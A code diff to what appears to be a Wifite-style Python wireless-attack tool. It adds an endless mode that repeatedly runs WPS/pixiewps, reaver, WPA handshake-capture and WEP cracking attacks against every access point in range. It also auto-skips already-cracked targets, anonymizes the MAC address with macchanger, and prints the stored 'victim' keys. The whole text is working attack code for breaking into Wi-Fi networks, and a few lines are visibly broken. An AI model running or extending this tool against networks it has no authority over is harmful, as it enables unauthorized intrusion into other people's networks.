@@ -88,7 +88,7 @@ from subprocess import call
 # GLOBAL VARIABLES IN ALL CAPS #
 ################################
 
-REVISION = 104
+REVISION = 106
 
 
 # WPA variables
@@ -156,6 +156,8 @@ CRACKED_TARGETS    = []    # List of targets we have already cracked
 ATTACK_ALL_TARGETS = False # Flag for when we want to attack *everyone*
 ATTACK_MIN_POWER   = 0     # Minimum power (dB) for access point to be considered a target
 VERBOSE_APS        = True  # Print access points as they appear
+ENDLESS            = 1
+TOTAL_RUNS         = 0
 
 #Pixie variables
 PIXIE_TIMEOUT	   = 660   # timeout for pixiewps attack
@@ -250,7 +252,7 @@ def main():
 	"""
 		Where the magic happens.
 	"""
-	global TARGETS_REMAINING, THIS_MAC, CRACKED_TARGETS
+	global TARGETS_REMAINING, THIS_MAC, CRACKED_TARGETS, TOTAL_RUNS
 	
 	CRACKED_TARGETS = load_cracked() # Load previously-cracked APs from file
 
@@ -265,7 +267,9 @@ def main():
 	THIS_MAC = get_mac_address(iface) # Store current MAC address
 	
 	(targets, clients) = scan(iface=iface, channel=TARGET_CHANNEL)
-	
+
+	auto_skip = True	
+
 	try:
 		index = 0
 		while index < len(targets):
@@ -275,10 +279,17 @@ def main():
 				if already.bssid == targets[index].bssid:
 					print R+'\n [!]'+O+' you have already cracked this access point\'s key!'+W
 					print R+' [!] %s' % (C+already.ssid+W+': "'+G+already.key+W+'"')
-					ri = raw_input(GR+' [+] '+W+'do you want to crack this access point again? ('+G+'y/'+O+'n'+W+'): ')
-					if ri.lower() == 'n':
+					if auto_skip == True :
+						print R+'\n [!]'+O+' Automatically skipping!'+W	
 						targets.pop(index)
 						index -= 1
+						
+					else:
+						ri = raw_input(GR+' [+] '+W+'do you want to crack this access point again? ('+G+'y/'+O+'n'+W+'): ')
+						if ri.lower() == 'n':
+							targets.pop(index)
+							index -= 1
+						
 					break
 
 			# Check if handshakes already exist, ask user whether to skip targets or save new handshakes
@@ -299,7 +310,6 @@ def main():
 					remove_file(handshake_file)
 					continue
 			index += 1
-			
 
 	except KeyboardInterrupt:
 		print '\n '+R+'(^C)'+O+' interrupted\n'
@@ -311,40 +321,50 @@ def main():
 	wep_total   = 0
 	
 	TARGETS_REMAINING = len(targets)
-	for t in targets:
-		TARGETS_REMAINING -= 1
-		
-		# Build list of clients connected to target
-		ts_clients = []
-		for c in clients:
-			if c.station == t.bssid:
-				ts_clients.append(c)
-		
+
+	try:
+		while not TOTAL_RUNS == ENDLESS or ENDLESS == 0:
+			print ' run %s' % (TOTAL_RUNS + 1)
+			for t in targets:
+				TARGETS_REMAINING -= 1
+				
+				# Build list of clients connected to target
+				ts_clients = []
+				for c in clients:
+					if c.station == t.bssid:
+						ts_clients.append(c)
+				
+				print ''
+				if t.encryption.find('WPA') != -1:
+					need_handshake = True
+					if not WPS_DISABLE and t.wps:
+						need_handshake = not wps_attack(iface, t)
+						wpa_total += 1
+					
+					if not need_handshake: wpa_success += 1
+					if TARGETS_REMAINING < 0: break
+					
+					if not WPA_DISABLE and need_handshake:
+						wpa_total += 1
+						if wpa_get_handshake(iface, t, ts_clients):
+							wpa_success += 1
+					
+				elif t.encryption.find('WEP') != -1:
+					wep_total += 1
+					if attack_wep(iface, t, ts_clients):
+						wep_success += 1
+				
+				else: print R+' unknown encryption:',t.encryption,W
+				
+				# If user wants to stop attacking 
+				if TARGETS_REMAINING <= 0: break
+			TOTAL_RUNS += 1	
+	except KeyboardInterrupt:
+		print R+'\n (^C)'+O+'attack interrupted'+W
+		print 'Total runs - %s' % (TOTAL_RUNS + 1)
 		print ''
-		if t.encryption.find('WPA') != -1:
-			need_handshake = True
-			if not WPS_DISABLE and t.wps:
-				need_handshake = not wps_attack(iface, t)
-				wpa_total += 1
-			
-			if not need_handshake: wpa_success += 1
-			if TARGETS_REMAINING < 0: break
-			
-			if not WPA_DISABLE and need_handshake:
-				wpa_total += 1
-				if wpa_get_handshake(iface, t, ts_clients):
-					wpa_success += 1
-			
-		elif t.encryption.find('WEP') != -1:
-			wep_total += 1
-			if attack_wep(iface, t, ts_clients):
-				wep_success += 1
+		exit_gracefully(0)
 		
-		else: print R+' unknown encryption:',t.encryption,W
-		
-		# If user wants to stop attacking
-		if TARGETS_REMAINING <= 0: break
-	
 	if wpa_total + wep_total > 0:
 		# Attacks are done! Show results to user
 		print ''
@@ -448,7 +468,8 @@ def handle_args():
 	global WEP_CAFFELATTE, WEP_P0841, WEP_HIRTE, WEP_CRACK_AT_IVS, WEP_IGNORE_FAKEAUTH
 	global WEP_SAVE, SHOW_MAC_IN_SCAN, ATTACK_ALL_TARGETS, ATTACK_MIN_POWER
 	global WPS_DISABLE, WPS_TIMEOUT, WPS_RATIO_THRESHOLD, WPS_MAX_RETRIES
-	global VERBOSE_APS, PIXIE_TIMEOUT, PIXIE_ONLY, PIXIE_NOPSK, PIXIE_ADD_TO
+	global VERBOSE_APS, PIXIE_TIMEOUT, PIXIE_ONLY, PIXIE_NOPSK, PIXIE_ADD_TO, ENDLESS
+	global TOTAL_RUNS
 
 	args = argv[1:]
 	if args.count('-h') + args.count('--help') + args.count('?') + args.count('-help') > 0:
@@ -515,6 +536,10 @@ def handle_args():
 				except ValueError: print R+' [!]'+O+' invalid power level: %s' % (R+args[i]+W)
 				except IndexError: print R+' [!]'+O+' no power level given!'+W
 				else: print GR+' [+]'+W+' minimum target power set to %s' % (G+args[i] + "dB"+W)
+			elif args[i] == '-endless':
+				ENDLESS = 0
+				print GR+' [+]'+W+' Looping through targets endlessly'
+
 			elif args[i] == '-q' or args[i] == '-quiet':
 				VERBOSE_APS = False
 				print GR+' [+]'+W+' list of APs during scan '+O+'disabled'+W
@@ -850,6 +875,7 @@ def help():
 
 	print head+'   GLOBAL'+W
 	print sw+'\t-all         \t'+des+'attack all targets.              '+de+'[off]'+W
+	print sw+'\t-endless     \t'+des+'attack all targets endlessly     '+de+'[off]'+W
 	print sw+'\t-i '+var+'<iface>  \t'+des+'wireless interface for capturing '+de+'[auto]'+W
 	print sw+'\t-mac         \t'+des+'anonymize mac address            '+de+'[off]'+W
 	print sw+'\t-c '+var+'<channel>\t'+des+'channel to scan for targets      '+de+'[auto]'+W
@@ -894,9 +920,9 @@ def help():
 	print sw+'\t-wpsretry '+var+'<num>\t'+des+'max number of retries for same PIN before giving up '+de+'[0]'+W
 
 	print head+'\n   PixieWPS'+W
-	print sw+'\t-ponly       \t'+des+'only target WPS networks/only use pixiewps       '+de+'[off]'+W
-	print sw+'\t-pto '+var+'<sec>  \t'+des+'max wait pixiewps before giving up (0: never)  '+de+'[660]'+W
-	print sw+'\t-pnopsk    \t'+des+'Do not run reaver on successful pixiewps attack       '+de+'[off]'+W
+	print sw+'\t-ponly       \t'+des+'only target WPS networks/only use pixiewps                '+de+'[off]'+W
+	print sw+'\t-pto '+var+'<sec>  \t'+des+'max wait pixiewps before giving up (0: never)       '+de+'[660]'+W
+	print sw+'\t-pnopsk    \t'+des+'Do not run reaver on successful pixiewps attack             '+de+'[off]'+W
 	print sw+'\t-paddto '+var+'<sec>  \t'+des+'add n seconds to timeout on each hash retrevial  '+de+'[30]'+W
 
 
@@ -932,6 +958,7 @@ def enable_monitor_mode(iface):
 	call(['airmon-ng', 'start', iface], stdout=DN, stderr=DN)
 	print 'done'
 	IFACE_TO_TAKE_DOWN = get_iface()
+	mac_anonymize(IFACE_TO_TAKE_DOWN)
 	return IFACE_TO_TAKE_DOWN
 
 
@@ -995,7 +1022,7 @@ def get_iface():
 	
 	for line in proc.communicate()[0].split('\n'):
 		if len(line) == 0 or line.startswith('Interface'): continue
-		#monitors.append(line[:line.find('\t')])
+		if len(line) == 29: continue
 		monitors.append(line)
 	
 	if len(monitors) == 0:
@@ -1003,18 +1030,17 @@ def get_iface():
 		print R+' [!]'+O+" you need to plug in a wifi device or install drivers.\n"+W
 		exit_gracefully(0)
 	elif WIRELESS_IFACE != '' and monitors.count(WIRELESS_IFACE) > 0:
-		mac_anonymize(monitor)
+		#mac_anonymize(monitor)
 		return enable_monitor-mode
 
 	elif len(monitors) == 1:
 		monitor = monitors[0][:monitors[0].find('\t')]
 		print monitor
-		mac_anonymize(monitor)
+		#mac_anonymize(monitor)
 		
 		return enable_monitor_mode(monitor)
 	
 	print GR+" [+]"+W+" available wireless devices:"
-	#print monitors
 	for i, monitor in enumerate(monitors):
 		print "  %s%d%s. %s" % (G, i + 1, W, monitor)
 	ri = raw_input(GR+" [+]"+W+" select number of device to put into monitor mode (%s1-%d%s): " % (G, len(monitors), W))
@@ -1025,9 +1051,10 @@ def get_iface():
 	monitor2 = monitors[i-1]
 	monitort = monitor2.split('\t',2)[1]
 	monitor = monitors[i-1][:monitors[i-1].find('\t')]
-	if monitor.startswith('phy'): monitor = monitort
-		
-	mac_anonymize(monitor)
+	if monitor.startswith('phy'): monitor = monitort		
+	#mac_anonymize(monitor)
+
+
 
 	return enable_monitor_mode(monitor)
 
@@ -1398,7 +1425,7 @@ def wps_check_targets(targets, cap_file, verbose=True):
 	for line in proc_walsh.communicate()[0].split('\n'):
 		if line.strip() == '' or line.startswith('Scanning for'): continue
 		bssid = line.split(' ')[0]
-		if line.count(':') > 0:
+		if line.count(':') > 1:
 			locked = line.split(' ')[42]
 		for t in targets:
 			if t.bssid.lower() == bssid.lower():
@@ -1613,7 +1640,7 @@ def mac_anonymize(iface):
 	print GR+" [+]"+W+" changing %s's MAC from %s to %s..." % (G+iface+W, G+old_mac+W, O+new_mac+W),
 	stdout.flush()
 	
-	proc = Popen(['ifconfig', iface, 'hw', 'ether', new_mac], stdout=PIPE, stderr=DN)
+	proc = Popen(['macchanger', '--mac', new_mac, iface], stdout=PIPE, stderr=DN)
 	proc.wait()
 	call(['ifconfig', iface, 'up'], stdout=DN, stderr=DN)
 	print 'done'
@@ -1975,6 +2002,16 @@ def wpa_get_handshake(iface, target, clients):
 				print R+' [0:00:00]'+O+' unable to capture handshake in time'+W
 	
 		except KeyboardInterrupt: 
+			if ENDLESS == 0:
+				if len(CRACKED_TARGETS) == 0:
+					print R+' [!]'+O+' there are not cracked access points saved to '+R+'cracked.txt\n'+W
+					exit_gracefully(1)
+				print GR+' [+]'+W+' '+W+'previously cracked access points'+W+':'
+				for victim in CRACKED_TARGETS:
+					print '     %s (%s) : "%s"' % (C+victim.ssid+W, C+victim.bssid+W, G+victim.key+W)
+				print ''
+
+				exit_gracefully(0)
 			print R+'\n (^C)'+O+' WPA handshake capture interrupted'+W
 			if attack_interrupted_prompt():
 				remove_airodump_files(temp + 'wpa')
@@ -2202,7 +2239,7 @@ def save_cracked(bssid, ssid, key, encryption):
 	"""
 		Saves cracked access point key and info to a file.
 	"""
-	sep = chr(0)
+	sep = chr(9)
 	fout = open('cracked.txt', 'a')
 	fout.write(bssid + sep + ssid + sep + key + sep + encryption + '\n')
 	fout.flush()
@@ -2220,7 +2257,7 @@ def load_cracked():
 	fin.close()
 	
 	for line in lines:
-		fields = line.split(chr(0))
+		fields = line.split(chr(9))
 		if len(fields) <= 3: continue
 		tar = Target(fields[0], '', '', '', fields[3], fields[1])
 		tar.key = fields[2]
@@ -2305,7 +2342,18 @@ def wpa_crack(capfile):
 			       (GR+sec_to_hms(time.time() - start_time)+W, G+add_commas(kt)+W, G, kps, W),
 			stdout.flush()
 			
-	except KeyboardInterrupt: print R+'\n (^C)'+O+' WPA cracking interrupted'+W
+	except KeyboardInterrupt: 
+		if ENDLESS == 0:
+			if len(CRACKED_TARGETS) == 0:
+				print R+' [!]'+O+' there are not cracked access points saved to '+R+'cracked.txt\n'+W
+				exit_gracefully(1)
+			print GR+' [+]'+W+' '+W+'previously cracked access points'+W+':'
+			for victim in CRACKED_TARGETS:
+				print '     %s (%s) : "%s"' % (C+victim.ssid+W, C+victim.bssid+W, G+victim.key+W)
+			print ''
+
+			exit_gracefully(0)
+		print R+'\n (^C)'+O+' WPA cracking interrupted'+W
 	
 	send_interrupt(proc)
 	try: os.kill(proc.pid, SIGTERM)
@@ -2595,6 +2643,16 @@ def attack_wep(iface, target, clients):
 			
 		# Keyboard interrupt during attack
 		except KeyboardInterrupt:
+			if ENDLESS == 0:
+				if len(CRACKED_TARGETS) == 0:
+					print R+' [!]'+O+' there are not cracked access points saved to '+R+'cracked.txt\n'+W
+					exit_gracefully(1)
+				print GR+' [+]'+W+' '+W+'previously cracked access points'+W+':'
+				for victim in CRACKED_TARGETS:
+					print '     %s (%s) : "%s"' % (C+victim.ssid+W, C+victim.bssid+W, G+victim.key+W)
+				print ''
+
+				exit_gracefully(0)
 			print R+'\n (^C)'+O+' WEP attack interrupted\n'+W
 			
 			send_interrupt(proc_airodump)
@@ -2888,6 +2946,7 @@ def wps_attack(iface, target):
 	EHash2b=""
 	AuthKeyb=""
 	ENonceb=""
+	hash_suc = 0
 
 	p_out = open(temp + "reaver_out.out", "w")
 	#Run reaver to collect hashes
@@ -2909,30 +2968,36 @@ def wps_attack(iface, target):
 				if "E-Nonce:" in line and ENonceb == "":                                                                                                     
 					print GR+' [+]'+G+' E-Nonce found'                                                                                         
 					ENonceb="1"
-					PIXIE_TIMEOUT == PIXIE_TIMEOUT + PIXIE_ADD_TO                                      
+					p_run=p_run+PIXIE_ADD_TO 
+					hash_suc = hash_suc + 1                                     
 				if "PKE:" in line and PKEb == "":
 					print GR+' [+]'+G+' PKE hash found'
 					PKEb="1"
-					PIXIE_TIMEOUT == PIXIE_TIMEOUT + PIXIE_ADD_TO
+					p_run=p_run+PIXIE_ADD_TO                                    
+					hash_suc = hash_suc + 1                                       
        			        if "PKR:" in line and PKRb == "":                 
        		        	        print GR+' [+]'+G+' PKR hash found'     
        	 	            		PKRb="1"  
-					PIXIE_TIMEOUT == PIXIE_TIMEOUT + PIXIE_ADD_TO                              
+					p_run=p_run+PIXIE_ADD_TO                                      
+					hash_suc = hash_suc + 1                                     
 				if "AuthKey:" in line and AuthKeyb == "":
 					print GR+' [+]'+G+' Authkey found'
 					AuthKeyb="1"
-					PIXIE_TIMEOUT == PIXIE_TIMEOUT + PIXIE_ADD_TO
+					p_run=p_run+PIXIE_ADD_TO                                      
+					hash_suc = hash_suc + 1                                     
 				if "E-Hash1" in line and EHash1b == "":
 					print GR+' [+]'+G+' E-Hash1 found'
 					EHash1b="1"
-					PIXIE_TIMEOUT == PIXIE_TIMEOUT + PIXIE_ADD_TO
+					p_run=p_run+PIXIE_ADD_TO                                      
+					hash_suc = hash_suc + 1                                     
 				if "E-Hash2" in line:
 					os.kill(pid, signal.SIGQUIT)
 					print GR+' [+]'+G+' E-Hash2 found'
 					pixie = True
 					pixie_exit = True
 				if PIXIE_TIMEOUT > 0 and p_run < int(time.time()):
-					print R+'\n [!]'+O+' unable to complete in %d seconds' % (PIXIE_TIMEOUT)
+					pcompleted=PIXIE_TIMEOUT + (PIXIE_ADD_TO * hash_suc)
+					print R+'\n [!]'+O+' unable to complete in %d seconds' % (pcompleted)
 					print R+' [+]'+W+' skipping pixiewps on %s' % (O+target.ssid+W)
 					WPSpin="WPS pin not found!"
 					pixie_exit=True	
@@ -2941,6 +3006,17 @@ def wps_attack(iface, target):
 
 	except KeyboardInterrupt:
 		print R+'\n (^C)'+O+' Pixiewps attack interrupted'+W
+		if ENDLESS == 0:
+			if len(CRACKED_TARGETS) == 0:
+				print R+' [!]'+O+' there are not cracked access points saved to '+R+'cracked.txt\n'+W
+				exit_gracefully(1)
+			print GR+' [+]'+W+' '+W+'previously cracked access points'+W+':'
+			for victim in CRACKED_TARGETS:
+				print '     %s (%s) : "%s"' % (C+victim.ssid+W, C+victim.bssid+W, G+victim.key+W)
+			print ''
+
+			exit_gracefully(0)
+
 		if attack_interrupted_prompt():
 			send_interrupt(pid)
 			print ''
@@ -3146,6 +3222,16 @@ def wps_attack(iface, target):
 				save_cracked(target.bssid, target.ssid, "Key is '" + key + "' and PIN is '" + pin + "'", 'WPA')
 			
 		except KeyboardInterrupt:
+			if ENDLESS == 0:
+				if len(CRACKED_TARGETS) == 0:
+					print R+' [!]'+O+' there are not cracked access points saved to '+R+'cracked.txt\n'+W
+					exit_gracefully(1)
+				print GR+' [+]'+W+' '+W+'previously cracked access points'+W+':'
+				for victim in CRACKED_TARGETS:
+					print '     %s (%s) : "%s"' % (C+victim.ssid+W, C+victim.bssid+W, G+victim.key+W)
+				print ''
+
+				exit_gracefully(0)
 			print R+'\n (^C)'+O+' WPS brute-force attack interrupted'+W
 			if attack_interrupted_prompt():
 				send_interrupt(proc)
